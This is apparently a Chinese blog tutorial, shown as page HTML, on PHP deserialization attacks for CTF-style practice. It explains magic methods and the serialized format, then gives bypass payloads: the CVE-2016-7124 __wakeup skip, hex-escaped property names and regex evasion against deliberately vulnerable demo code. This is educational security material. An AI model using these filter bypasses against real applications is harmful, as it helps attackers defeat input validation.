href="#directoryiterator-遍历目录" class="toc-link text-gray-700 dark:text-gray-300 hover:text-gray-900 dark:hover:text-white hover:bg-gray-100 dark:hover:bg-gray-700 transition-colors duration-300" data-astro-cid-woz2nwfv> 3.3. DirectoryIterator 遍历目录 </a> </li><li data-astro-cid-woz2nwfv> <a href="#filesystemiterator-遍历目录" class="toc-link text-gray-700 dark:text-gray-300 hover:text-gray-900 dark:hover:text-white hover:bg-gray-100 dark:hover:bg-gray-700 transition-colors duration-300" data-astro-cid-woz2nwfv> 3.4. FilesystemIterator 遍历目录 </a> </li><li data-astro-cid-woz2nwfv> <a href="#soapclient-ssrf" class="toc-link text-gray-700 dark:text-gray-300 hover:text-gray-900 dark:hover:text-white hover:bg-gray-100 dark:hover:bg-gray-700 transition-colors duration-300" data-astro-cid-woz2nwfv> 3.5. SoapClient SSRF </a> </li> </ol> </li><li data-astro-cid-woz2nwfv> <a href="#phar-反序列化" class="toc-link text-gray-700 dark:text-gray-300 hover:text-gray-900 dark:hover:text-white hover:bg-gray-100 dark:hover:bg-gray-700 transition-colors duration-300" data-astro-cid-woz2nwfv> 4. Phar 反序列化 </a> <ol class="toc-sublist border-l border-gray-200 dark:border-gray-600" data-astro-cid-woz2nwfv> <li data-astro-cid-woz2nwfv> <a href="#ctfshow-web入门-web276" class="toc-link text-gray-700 dark:text-gray-300 hover:text-gray-900 dark:hover:text-white hover:bg-gray-100 dark:hover:bg-gray-700 transition-colors duration-300" data-astro-cid-woz2nwfv> 4.1. [CTFShow Web入门] Web276 </a> </li> </ol> </li><li data-astro-cid-woz2nwfv> <a href="#字符串逃逸" class="toc-link text-gray-700 dark:text-gray-300 hover:text-gray-900 dark:hover:text-white hover:bg-gray-100 dark:hover:bg-gray-700 transition-colors duration-300" data-astro-cid-woz2nwfv> 5. 字符串逃逸 </a> <ol class="toc-sublist border-l border-gray-200 dark:border-gray-600" data-astro-cid-woz2nwfv> <li data-astro-cid-woz2nwfv> <a href="#字符变多" class="toc-link text-gray-700 dark:text-gray-300 hover:text-gray-900 dark:hover:text-white hover:bg-gray-100 dark:hover:bg-gray-700 transition-colors duration-300" data-astro-cid-woz2nwfv> 5.1. 字符变多 </a> </li><li data-astro-cid-woz2nwfv> <a href="#字符变少" class="toc-link text-gray-700 dark:text-gray-300 hover:text-gray-900 dark:hover:text-white hover:bg-gray-100 dark:hover:bg-gray-700 transition-colors duration-300" data-astro-cid-woz2nwfv> 5.2. 字符变少 </a> </li> </ol> </li><li data-astro-cid-woz2nwfv> <a href="#pop链构造" class="toc-link text-gray-700 dark:text-gray-300 hover:text-gray-900 dark:hover:text-white hover:bg-gray-100 dark:hover:bg-gray-700 transition-colors duration-300" data-astro-cid-woz2nwfv> 6. POP链构造 </a>  </li><li data-astro-cid-woz2nwfv> <a href="#写在后面" class="toc-link text-gray-700 dark:text-gray-300 hover:text-gray-900 dark:hover:text-white hover:bg-gray-100 dark:hover:bg-gray-700 transition-colors duration-300" data-astro-cid-woz2nwfv> 7. 写在后面 </a>  </li> </ol> </nav>  <script lang="js">
+  function initTableOfContents() {
+    const links = document.querySelectorAll('.toc-link');
+    const headings = Array.from(links)
+      .map(link => {
+        const href = link.getAttribute('href');
+        if (href && href.startsWith('#')) {
+          const id = href.slice(1);
+          return document.getElementById(id);
+        }
+        return null;
+      })
+      .filter(element => element !== null);
+
+    // 平滑滚动功能
+    function scrollToElement(targetId) {
+      const target = document.getElementById(targetId);
+      if (target) {
+        const headerOffset = 100;
+        const elementPosition = target.getBoundingClientRect().top;
+        const offsetPosition = elementPosition + window.pageYOffset - headerOffset;
+
+        window.scrollTo({
+          top: offsetPosition,
+          behavior: 'smooth'
+        });
+      }
+    }
+
+    // 设置活跃链接
+    function setActiveLink(targetId) {
+      links.forEach(link => link.classList.remove('active'));
+      
+      const activeLink = document.querySelector('.toc-link[href="#' + targetId + '"]');
+      if (activeLink) {
+        activeLink.classList.add('active');
+        
+        if (window.location.hash.slice(1) !== targetId) {
+          history.replaceState(null, '', '#' + targetId);
+        }
+      }
+    }
+
+    // 设置平滑滚动
+    links.forEach(link => {
+      link.addEventListener('click', function(e) {
+        e.preventDefault();
+        const href = link.getAttribute('href');
+        if (href && href.startsWith('#')) {
+          const targetId = href.slice(1);
+          scrollToElement(targetId);
+        }
+      });
+    });
+
+    // 设置交集观察器
+    const observer = new IntersectionObserver(
+      function(entries) {
+        const visibleEntries = entries.filter(entry => entry.isIntersecting);
+        if (visibleEntries.length > 0) {
+          const visibleEntry = visibleEntries.reduce(function(prev, current) {
+            return prev.boundingClientRect.top < current.boundingClientRect.top ? prev : current;
+          });
+          setActiveLink(visibleEntry.target.id);
+        }
+      },
+      { rootMargin: '-10% 0px -70% 0px' }
+    );
+
+    headings.forEach(function(heading) {
+      observer.observe(heading);
+    });
+
+    // 处理初始哈希
+    function handleInitialHash() {
+      const hash = window.location.hash;
+      if (hash) {
+        setTimeout(function() {
+          const targetId = hash.slice(1);
+          scrollToElement(targetId);
+          setActiveLink(targetId);
+        }, 300); // 增加延迟时间，确保页面完全加载
+      }
+    }
+
+    // 处理哈希变化
+    function handleHashChange() {
+      const hash = window.location.hash;
+      if (hash) {
+        const targetId = hash.slice(1);
+        scrollToElement(targetId);
+        setActiveLink(targetId);
+      }
+    }
+
+    // 确保在不同加载阶段都能正确处理锚点
+    handleInitialHash();
+    window.addEventListener('popstate', handleInitialHash);
+    window.addEventListener('hashchange', handleHashChange);
+    
+    // 页面完全加载后再次检查
+    window.addEventListener('load', function() {
+      setTimeout(handleInitialHash, 100);
+    });
+  }
+
+  // 初始化
+  if (document.readyState === 'loading') {
+    document.addEventListener('DOMContentLoaded', initTableOfContents);
+  } else {
+    initTableOfContents();
+  }
+</script>  <div class="lightbox-wrapper" data-astro-cid-vqtgpguw>  <section id="article" class="prose prose-lg max-w-none dark:prose-invert" aria-label="文章正文">   <h2 id="写在前面">写在前面</h2>
+<p>PHP是一门 <code>面向对象</code> 编程的语言，对象是PHP中非常常见的概念，几乎所有的数据类型都可以作为对象来处理。
+在PHP中，对象是一种复合数据类型，也称为 <code>实例</code>。对象的定义和创建通常包括两个步骤：<code>定义类</code> 和 <code>创建对象</code>。</p>
+<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="php"><code><span class="line" data-line="1"><span style="color:#6A737D">// 定义类</span></span>
+<span class="line" data-line="2"><span style="color:#F97583">class</span><span style="color:#B392F0"> ClassName</span><span style="color:#E1E4E8"> {</span></span>
+<span class="line" data-line="3"><span style="color:#6A737D">// 这里是类的属性和方法定义</span></span>
+<span class="line" data-line="4"><span style="color:#E1E4E8">}</span></span></code></pre>
+<hr>
+<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="php"><code><span class="line" data-line="1"><span style="color:#6A737D">// 创建对象</span></span>
+<span class="line" data-line="2"><span style="color:#E1E4E8">$obj </span><span style="color:#F97583">=</span><span style="color:#F97583"> new</span><span style="color:#79B8FF"> ClassName</span><span style="color:#E1E4E8">()</span></span></code></pre>
+<p>在PHP中，可以通过序列化（serialize）和反序列化（unserialize）来保存和恢复对象。序列化是将对象转换为一种可以存储或传输的格式，反序列化则是将数据转换回对象。</p>
+<p>如果反序列化过程中用户对某些参数可控，从而控制内部的变量设置函数，那就可以利用反序列化构造攻击。</p>
+<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="php"><code><span class="line" data-line="1"><span style="color:#79B8FF">serialize</span><span style="color:#E1E4E8">()     </span><span style="color:#6A737D">//将一个对象转换成字符串</span></span>
+<span class="line" data-line="2"><span style="color:#79B8FF">unserialize</span><span style="color:#E1E4E8">()   </span><span style="color:#6A737D">//将字符串还原成一个对象</span></span></code></pre>
+<!--more-->
+<h3 id="魔术方法">魔术方法</h3>
+<p>PHP类中有一种特殊函数体的存在叫魔术方法，它的命名是以两个下划线符号 <code>__</code> 开头的，后面跟着一个字符串，比如 <code>__toString()</code></p>
+<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="php"><code><span class="line" data-line="1"><span style="color:#B392F0">__construct</span><span style="color:#E1E4E8">()   </span><span style="color:#6A737D">// 每次创建新对象时先调用此方法</span></span>
+<span class="line" data-line="2"><span style="color:#B392F0">__wakeup</span><span style="color:#E1E4E8">()      </span><span style="color:#6A737D">// 执行unserialize()时，先会调用这个函数</span></span>
+<span class="line" data-line="3"><span style="color:#B392F0">__sleep</span><span style="color:#E1E4E8">()       </span><span style="color:#6A737D">// 执行serialize()时，先会调用这个函数</span></span>
+<span class="line" data-line="4"><span style="color:#B392F0">__destruct</span><span style="color:#E1E4E8">()    </span><span style="color:#6A737D">// 对象被销毁时触发</span></span>
+<span class="line" data-line="5"><span style="color:#B392F0">__call</span><span style="color:#E1E4E8">()        </span><span style="color:#6A737D">// 在对象上下文中调用不可访问的方法时触发</span></span>
+<span class="line" data-line="6"><span style="color:#B392F0">__callStatic</span><span style="color:#E1E4E8">()  </span><span style="color:#6A737D">// 在静态上下文中调用不可访问的方法时触发</span></span>
+<span class="line" data-line="7"><span style="color:#B392F0">__get</span><span style="color:#E1E4E8">()         </span><span style="color:#6A737D">// 用于从不可访问的属性读取数据或者不存在这个键都会调用此方法</span></span>
+<span class="line" data-line="8"><span style="color:#B392F0">__set</span><span style="color:#E1E4E8">()         </span><span style="color:#6A737D">// 用于将数据写入不可访问的属性</span></span>
+<span class="line" data-line="9"><span style="color:#B392F0">__isset</span><span style="color:#E1E4E8">()       </span><span style="color:#6A737D">// 在不可访问的属性上调用isset()或empty()触发</span></span>
+<span class="line" data-line="10"><span style="color:#B392F0">__unset</span><span style="color:#E1E4E8">()       </span><span style="color:#6A737D">// 在不可访问的属性上使用unset()时触发</span></span>
+<span class="line" data-line="11"><span style="color:#B392F0">__toString</span><span style="color:#E1E4E8">()    </span><span style="color:#6A737D">// 把类当作字符串使用时触发</span></span>
+<span class="line" data-line="12"><span style="color:#B392F0">__invoke</span><span style="color:#E1E4E8">()      </span><span style="color:#6A737D">// 当尝试将对象调用为函数时触发</span></span></code></pre>
+<h3 id="访问控制符">访问控制符</h3>
+<blockquote>
+<p>\x00为空字符，一个空字符长度为 1</p>
+</blockquote>
+<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="php"><code><span class="line" data-line="1"><span style="color:#F97583">public</span><span style="color:#E1E4E8"> (</span><span style="color:#79B8FF">公有</span><span style="color:#E1E4E8">)          </span><span style="color:#6A737D">// 序列化后格式 属性名</span></span>
+<span class="line" data-line="2"><span style="color:#F97583">protected</span><span style="color:#E1E4E8"> (</span><span style="color:#79B8FF">受保护</span><span style="color:#E1E4E8">)     </span><span style="color:#6A737D">// 序列化后格式 \x00*\x00属性名</span></span>
+<span class="line" data-line="3"><span style="color:#F97583">private</span><span style="color:#E1E4E8"> (</span><span style="color:#79B8FF">私有</span><span style="color:#E1E4E8">)        </span><span style="color:#6A737D">// 序列化后格式 \x00类名\x00属性名</span></span></code></pre>
+<h3 id="举个例子">举个例子</h3>
+<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="php"><code><span class="line" data-line="1"><span style="color:#F97583">&#x3C;?</span><span style="color:#79B8FF">php</span></span>
+<span class="line" data-line="2"><span style="color:#F97583">class</span><span style="color:#B392F0"> info</span><span style="color:#E1E4E8">{</span></span>
+<span class="line" data-line="3"><span style="color:#F97583">    public</span><span style="color:#E1E4E8"> $name </span><span style="color:#F97583">=</span><span style="color:#9ECBFF"> "iami233"</span><span style="color:#E1E4E8">;</span></span>
+<span class="line" data-line="4"><span style="color:#F97583">    protected</span><span style="color:#E1E4E8"> $age </span><span style="color:#F97583">=</span><span style="color:#9ECBFF"> "18"</span><span style="color:#E1E4E8">;</span></span>
+<span class="line" data-line="5"><span style="color:#F97583">    private</span><span style="color:#E1E4E8"> $sex </span><span style="color:#F97583">=</span><span style="color:#9ECBFF"> "unknown"</span><span style="color:#E1E4E8">;</span></span>
+<span class="line" data-line="6"><span style="color:#E1E4E8">}</span></span>
+<span class="line" data-line="7"></span>
+<span class="line" data-line="8"><span style="color:#E1E4E8">$test </span><span style="color:#F97583">=</span><span style="color:#F97583"> new</span><span style="color:#79B8FF"> info</span><span style="color:#E1E4E8">;</span></span>
+<span class="line" data-line="9"><span style="color:#79B8FF">echo</span><span style="color:#79B8FF"> serialize</span><span style="color:#E1E4E8">($test);</span></span></code></pre>
+<p>如果生成的序列化字符串较长或者包含 <code>protected</code> 或 <code>private</code> 属性，强烈建议使用 <code>urlencode()</code> 编码一下在输出</p>
+<blockquote>
+<p>当版本为 <code>PHP > 7.1</code> 时反序列化对<strong>类属性不敏感</strong>，将 <code>protected</code> 改成 <code>public</code> 亦可。</p>
+</blockquote>
+<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="php"><code><span class="line" data-line="1"><span style="color:#B392F0">O</span><span style="color:#E1E4E8">:</span><span style="color:#79B8FF">4</span><span style="color:#E1E4E8">:</span><span style="color:#9ECBFF">"info"</span><span style="color:#E1E4E8">:</span><span style="color:#79B8FF">3</span><span style="color:#E1E4E8">:{</span><span style="color:#79B8FF">s</span><span style="color:#E1E4E8">:</span><span style="color:#79B8FF">4</span><span style="color:#E1E4E8">:</span><span style="color:#9ECBFF">"name"</span><span style="color:#E1E4E8">;</span><span style="color:#79B8FF">s</span><span style="color:#E1E4E8">:</span><span style="color:#79B8FF">7</span><span style="color:#E1E4E8">:</span><span style="color:#9ECBFF">"iami233"</span><span style="color:#E1E4E8">;</span><span style="color:#79B8FF">s</span><span style="color:#E1E4E8">:</span><span style="color:#79B8FF">6</span><span style="color:#E1E4E8">:</span><span style="color:#9ECBFF">"</span><span style="color:#79B8FF">\x00</span><span style="color:#9ECBFF">*</span><span style="color:#79B8FF">\x00</span><span style="color:#9ECBFF">age"</span><span style="color:#E1E4E8">;</span><span style="color:#79B8FF">s</span><span style="color:#E1E4E8">:</span><span style="color:#79B8FF">2</span><span style="color:#E1E4E8">:</span><span style="color:#9ECBFF">"18"</span><span style="color:#E1E4E8">;</span><span style="color:#79B8FF">s</span><span style="color:#E1E4E8">:</span><span style="color:#79B8FF">8</span><span style="color:#E1E4E8">:</span><span style="color:#9ECBFF">"</span><span style="color:#79B8FF">\x00</span><span style="color:#9ECBFF">ctf</span><span style="color:#79B8FF">\x00</span><span style="color:#9ECBFF">sex"</span><span style="color:#E1E4E8">;</span><span style="color:#79B8FF">s</span><span style="color:#E1E4E8">:</span><span style="color:#79B8FF">7</span><span style="color:#E1E4E8">:</span><span style="color:#9ECBFF">"unknown"</span><span style="color:#E1E4E8">;}</span></span>
+<span class="line" data-line="2"><span style="color:#6A737D">// O:对象名的长度:"对象名":对象属性个数:{s:属性名的长度:"属性名";s:属性值的长度:"属性值";}</span></span></code></pre>
+<h3 id="反序列化特性">反序列化特性</h3>
+<ol>
+<li>反序列化的过程就是碰到 <code>;}</code>与最前面的 <code>{</code> 配对后，便停止反序列化，后面的数据会直接丢弃。</li>
+<li>反序列化的过程会根据 <code>s</code> 所指定的 <code>字符长度</code> 去读取后边的字符。如果指定的长度错误则反序列化就会失败。</li>
+<li>类中不存在的属性也会进行反序列化。</li>
+</ol>
+<h3 id="bypass">bypass</h3>
+<h4 id="wakeup绕过">wakeup绕过</h4>
+<blockquote>
+<p><code>PHP5</code> &#x3C; <code>5.6.25</code> 和 <code>PHP7</code> &#x3C; <code>7.0.10</code></p>
+</blockquote>
+<p><code>CVE-2016-7124</code> 当序列化字符串中表示对象属性个数的值<strong>大于</strong>真实的属性个数时会跳过 <strong>__wakeup</strong> 的执行，</p>
+<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="php"><code><span class="line" data-line="1"><span style="color:#B392F0">O</span><span style="color:#E1E4E8">:</span><span style="color:#79B8FF">4</span><span style="color:#E1E4E8">:</span><span style="color:#9ECBFF">"info"</span><span style="color:#E1E4E8">:</span><span style="color:#79B8FF">3</span><span style="color:#E1E4E8">:{</span><span style="color:#79B8FF">s</span><span style="color:#E1E4E8">:</span><span style="color:#79B8FF">4</span><span style="color:#E1E4E8">:</span><span style="color:#9ECBFF">"name"</span><span style="color:#E1E4E8">;</span><span style="color:#79B8FF">s</span><span style="color:#E1E4E8">:</span><span style="color:#79B8FF">7</span><span style="color:#E1E4E8">:</span><span style="color:#9ECBFF">"iami233"</span><span style="color:#E1E4E8">;</span><span style="color:#79B8FF">s</span><span style="color:#E1E4E8">:</span><span style="color:#79B8FF">6</span><span style="color:#E1E4E8">:</span><span style="color:#9ECBFF">"</span><span style="color:#79B8FF">\x00</span><span style="color:#9ECBFF">*</span><span style="color:#79B8FF">\x00</span><span style="color:#9ECBFF">age"</span><span style="color:#E1E4E8">;</span><span style="color:#79B8FF">s</span><span style="color:#E1E4E8">:</span><span style="color:#79B8FF">2</span><span style="color:#E1E4E8">:</span><span style="color:#9ECBFF">"18"</span><span style="color:#E1E4E8">;</span><span style="color:#79B8FF">s</span><span style="color:#E1E4E8">:</span><span style="color:#79B8FF">8</span><span style="color:#E1E4E8">:</span><span style="color:#9ECBFF">"</span><span style="color:#79B8FF">\x00</span><span style="color:#9ECBFF">ctf</span><span style="color:#79B8FF">\x00</span><span style="color:#9ECBFF">sex"</span><span style="color:#E1E4E8">;</span><span style="color:#79B8FF">s</span><span style="color:#E1E4E8">:</span><span style="color:#79B8FF">7</span><span style="color:#E1E4E8">:</span><span style="color:#9ECBFF">"unknown"</span><span style="color:#E1E4E8">;}</span></span></code></pre>
+<p>原本 <code>info</code> 的对象属性个数为 <code>3</code> ，我们直接改为 <code>4</code> 即可绕过 <code>__wakeup</code></p>
+<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="php"><code><span class="line" data-line="1"><span style="color:#B392F0">O</span><span style="color:#E1E4E8">:</span><span style="color:#79B8FF">4</span><span style="color:#E1E4E8">:</span><span style="color:#9ECBFF">"info"</span><span style="color:#E1E4E8">:</span><span style="color:#79B8FF">4</span><span style="color:#E1E4E8">:{</span><span style="color:#79B8FF">s</span><span style="color:#E1E4E8">:</span><span style="color:#79B8FF">4</span><span style="color:#E1E4E8">:</span><span style="color:#9ECBFF">"name"</span><span style="color:#E1E4E8">;</span><span style="color:#79B8FF">s</span><span style="color:#E1E4E8">:</span><span style="color:#79B8FF">7</span><span style="color:#E1E4E8">:</span><span style="color:#9ECBFF">"iami233"</span><span style="color:#E1E4E8">;</span><span style="color:#79B8FF">s</span><span style="color:#E1E4E8">:</span><span style="color:#79B8FF">6</span><span style="color:#E1E4E8">:</span><span style="color:#9ECBFF">"</span><span style="color:#79B8FF">\x00</span><span style="color:#9ECBFF">*</span><span style="color:#79B8FF">\x00</span><span style="color:#9ECBFF">age"</span><span style="color:#E1E4E8">;</span><span style="color:#79B8FF">s</span><span style="color:#E1E4E8">:</span><span style="color:#79B8FF">2</span><span style="color:#E1E4E8">:</span><span style="color:#9ECBFF">"18"</span><span style="color:#E1E4E8">;</span><span style="color:#79B8FF">s</span><span style="color:#E1E4E8">:</span><span style="color:#79B8FF">8</span><span style="color:#E1E4E8">:</span><span style="color:#9ECBFF">"</span><span style="color:#79B8FF">\x00</span><span style="color:#9ECBFF">ctf</span><span style="color:#79B8FF">\x00</span><span style="color:#9ECBFF">sex"</span><span style="color:#E1E4E8">;</span><span style="color:#79B8FF">s</span><span style="color:#E1E4E8">:</span><span style="color:#79B8FF">7</span><span style="color:#E1E4E8">:</span><span style="color:#9ECBFF">"unknown"</span><span style="color:#E1E4E8">;}</span></span></code></pre>
+<h4 id="16进制绕过">16进制绕过</h4>
+<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="php"><code><span class="line" data-line="1"><span style="color:#F97583">&#x3C;?</span><span style="color:#79B8FF">php</span></span>
+<span class="line" data-line="2"></span>
+<span class="line" data-line="3"><span style="color:#F97583">class</span><span style="color:#B392F0"> Test</span><span style="color:#E1E4E8"> {</span></span>
+<span class="line" data-line="4"><span style="color:#F97583">    public</span><span style="color:#E1E4E8"> $username;</span></span>
+<span class="line" data-line="5"><span style="color:#E1E4E8">    </span></span>
+<span class="line" data-line="6"><span style="color:#F97583">    public</span><span style="color:#F97583"> function</span><span style="color:#79B8FF"> __construct</span><span style="color:#E1E4E8">() {</span></span>
+<span class="line" data-line="7"><span style="color:#79B8FF">        $this</span><span style="color:#F97583">-></span><span style="color:#E1E4E8">username </span><span style="color:#F97583">=</span><span style="color:#9ECBFF"> 'admin'</span><span style="color:#E1E4E8">;</span></span>
+<span class="line" data-line="8"><span style="color:#E1E4E8">    }</span></span>
+<span class="line" data-line="9"></span>
+<span class="line" data-line="10"><span style="color:#F97583">    public</span><span style="color:#F97583"> function</span><span style="color:#79B8FF"> __destruct</span><span style="color:#E1E4E8">() {</span></span>
+<span class="line" data-line="11"><span style="color:#F97583">        if</span><span style="color:#E1E4E8"> (</span><span style="color:#79B8FF">$this</span><span style="color:#F97583">-></span><span style="color:#E1E4E8">username </span><span style="color:#F97583">==</span><span style="color:#9ECBFF"> 'admin'</span><span style="color:#E1E4E8">) {</span></span>
+<span class="line" data-line="12"><span style="color:#79B8FF">            echo</span><span style="color:#9ECBFF"> 'Success'</span><span style="color:#E1E4E8">;</span></span>
+<span class="line" data-line="13"><span style="color:#E1E4E8">        }</span></span>
+<span class="line" data-line="14"><span style="color:#E1E4E8">    }</span></span>
+<span class="line" data-line="15"><span style="color:#E1E4E8">}</span></span>
+<span class="line" data-line="16"></span>
+<span class="line" data-line="17"><span style="color:#F97583">function</span><span style="color:#B392F0"> filter</span><span style="color:#E1E4E8">($data){</span></span>
+<span class="line" data-line="18"><span style="color:#F97583">    if</span><span style="color:#E1E4E8"> (</span><span style="color:#79B8FF">preg_match</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">'/</span><span style="color:#DBEDFF">username</span><span style="color:#9ECBFF">/'</span><span style="color:#E1E4E8">, $data)) {</span></span>
+<span class="line" data-line="19"><span style="color:#F97583">        die</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"nonono!!!&#x3C;/br>"</span><span style="color:#E1E4E8">);</span></span>
+<span class="line" data-line="20"><span style="color:#E1E4E8">    }</span></span>
+<span class="line" data-line="21"><span style="color:#E1E4E8">    </span></span>
+<span class="line" data-line="22"><span style="color:#F97583">    return</span><span style="color:#79B8FF"> unserialize</span><span style="color:#E1E4E8">($data);</span></span>
+<span class="line" data-line="23"><span style="color:#E1E4E8">}</span></span>
+<span class="line" data-line="24"></span>
+<span class="line" data-line="25"><span style="color:#B392F0">filter</span><span style="color:#E1E4E8">($_GET[</span><span style="color:#9ECBFF">'data'</span><span style="color:#E1E4E8">]);</span></span></code></pre>
+<p>序列化字符串中过滤了一些字符串，可以使用十六进制绕过</p>
+<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="php"><code><span class="line" data-line="1"><span style="color:#B392F0">O</span><span style="color:#E1E4E8">:</span><span style="color:#79B8FF">4</span><span style="color:#E1E4E8">:</span><span style="color:#9ECBFF">"Test"</span><span style="color:#E1E4E8">:</span><span style="color:#79B8FF">1</span><span style="color:#E1E4E8">:{</span><span style="color:#79B8FF">s</span><span style="color:#E1E4E8">:</span><span style="color:#79B8FF">8</span><span style="color:#E1E4E8">:</span><span style="color:#9ECBFF">"username"</span><span style="color:#E1E4E8">;</span><span style="color:#79B8FF">s</span><span style="color:#E1E4E8">:</span><span style="color:#79B8FF">5</span><span style="color:#E1E4E8">:</span><span style="color:#9ECBFF">"admin"</span><span style="color:#E1E4E8">;}</span></span></code></pre>
+<p>字符类型的 <code>s</code> 大写时，会被当成 <code>16</code> 进制解析，<code>\75</code> 是 <code>u</code> 的16进制，</p>
+<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="php"><code><span class="line" data-line="1"><span style="color:#B392F0">O</span><span style="color:#E1E4E8">:</span><span style="color:#79B8FF">4</span><span style="color:#E1E4E8">:</span><span style="color:#9ECBFF">"Test"</span><span style="color:#E1E4E8">:</span><span style="color:#79B8FF">1</span><span style="color:#E1E4E8">:{</span><span style="color:#79B8FF">S</span><span style="color:#E1E4E8">:</span><span style="color:#79B8FF">8</span><span style="color:#E1E4E8">:</span><span style="color:#9ECBFF">"</span><span style="color:#79B8FF">\75</span><span style="color:#9ECBFF">sername"</span><span style="color:#E1E4E8">;</span><span style="color:#79B8FF">s</span><span style="color:#E1E4E8">:</span><span style="color:#79B8FF">5</span><span style="color:#E1E4E8">:</span><span style="color:#9ECBFF">"admin"</span><span style="color:#E1E4E8">;}</span></span></code></pre>
+<h4 id="绕过正则表达式">绕过正则表达式</h4>
+<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="php"><code><span class="line" data-line="1"><span style="color:#F97583">&#x3C;?</span><span style="color:#79B8FF">php</span></span>
+<span class="line" data-line="2"></span>
+<span class="line" data-line="3"><span style="color:#F97583">class</span><span style="color:#B392F0"> Test</span><span style="color:#E1E4E8"> {</span></span>
+<span class="line" data-line="4"><span style="color:#F97583">    public</span><span style="color:#E1E4E8"> $username;</span></span>
+<span class="line" data-line="5"></span>
+<span class="line" data-line="6"><span style="color:#F97583">    public</span><span style="color:#F97583"> function</span><span style="color:#79B8FF"> __construct</span><span style="color:#E1E4E8">() {</span></span>
+<span class="line" data-line="7"><span style="color:#79B8FF">        $this</span><span style="color:#F97583">-></span><span style="color:#E1E4E8">username </span><span style="color:#F97583">=</span><span style="color:#9ECBFF"> 'admin'</span><span style="color:#E1E4E8">;</span></span>
+<span class="line" data-line="8"><span style="color:#E1E4E8">    }</span></span>
+<span class="line" data-line="9"></span>
+<span class="line" data-line="10"><span style="color:#F97583">    public</span><span style="color:#F97583"> function</span><span style="color:#79B8FF"> __destruct</span><span style="color:#E1E4E8">() {</span></span>
+<span class="line" data-line="11"><span style="color:#F97583">        if</span><span style="color:#E1E4E8"> (</span><span style="color:#79B8FF">$this</span><span style="color:#F97583">-></span><span style="color:#E1E4E8">username </span><span style="color:#F97583">==</span><span style="color:#9ECBFF"> 'admin'</span><span style="color:#E1E4E8">) {</span></span>
+<span class="line" data-line="12"><span style="color:#79B8FF">            echo</span><span style="color:#9ECBFF"> 'Success'</span><span style="color:#E1E4E8">;</span></span>
+<span class="line" data-line="13"><span style="color:#E1E4E8">        }</span></span>
+<span class="line" data-line="14"><span style="color:#E1E4E8">    }</span></span>
+<span class="line" data-line="15"><span style="color:#E1E4E8">}</span></span>
+<span class="line" data-line="16"></span>
+<span class="line" data-line="17"><span style="color:#F97583">function</span><span style="color:#B392F0"> filter</span><span style="color:#E1E4E8">($data) {</span></span>
+<span class="line" data-line="18"><span style="color:#F97583">    if</span><span style="color:#E1E4E8"> (</span><span style="color:#79B8FF">preg_match</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">'/</span><span style="color:#F97583">^</span><span style="color:#DBEDFF">O:</span><span style="color:#85E89D;font-weight:bold">\d</span><span style="color:#F97583">+</span><span style="color:#DBEDFF">:</span><span style="color:#9ECBFF">/'</span><span style="color:#E1E4E8">, $data)) {</span></span>
+<span class="line" data-line="19"><span style="color:#F97583">        die</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">'Invalid input!'</span><span style="color:#E1E4E8">);</span></span>
+<span class="line" data-line="20"><span style="color:#E1E4E8">    }</span></span>
+<span class="line" data-line="21"></span>
+<span class="line" data-line="22"><span style="color:#F97583">    return</span><span style="color:#79B8FF"> unserialize</span><span style="color:#E1E4E8">($data);</span></span>
+<span class="line" data-line="23"><span style="color:#E1E4E8">}</span></span>
+<span class="line" data-line="24"></span>
+<span class="line" data-line="25"><span style="color:#B392F0">filter</span><span style="color:#E1E4E8">($_GET[</span><span style="color:#9ECBFF">'data'</span><span style="color:#E1E4E8">]);</span></span>
+<span class="line" data-line="26"></span></code></pre>
+<p>像这种，我们正常生成序列化后的数据如下所示</p>
+<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="php"><code><span class="line" data-line="1"><span style="color:#B392F0">O</span><span style="color:#E1E4E8">:</span><span style="color:#79B8FF">4</span><span style="color:#E1E4E8">:</span><span style="color:#9ECBFF">"Test"</span><span style="color:#E1E4E8">:</span><span style="color:#79B8FF">1</span><span style="color:#E1E4E8">:{</span><span style="color:#79B8FF">s</span><span style="color:#E1E4E8">:</span><span style="color:#79B8FF">8</span><span style="color:#E1E4E8">:</span><span style="color:#9ECBFF">"username"</span><span style="color:#E1E4E8">;</span><span style="color:#79B8FF">s</span><span style="color:#E1E4E8">:</span><span style="color:#79B8FF">5</span><span style="color:#E1E4E8">:</span><span style="color:#9ECBFF">"admin"</span><span style="color:#E1E4E8">;}</span></span></code></pre>
+<p>如果进行传参的话，<code>filter()</code> 不允许 <code>O:[数字]</code> 开头，这种情况下，我们可以利用以下的方法进行绕过</p>
+<ul>
+<li>利用加号绕过（注意在url里传参时+要编码为%2B）</li>
+<li>利用数组对象绕过，如 serialize(array($a)); a为要反序列化的对象(序列化结果开头是a，不影响作为数组元素的 $a 的析构)</li>
+</ul>
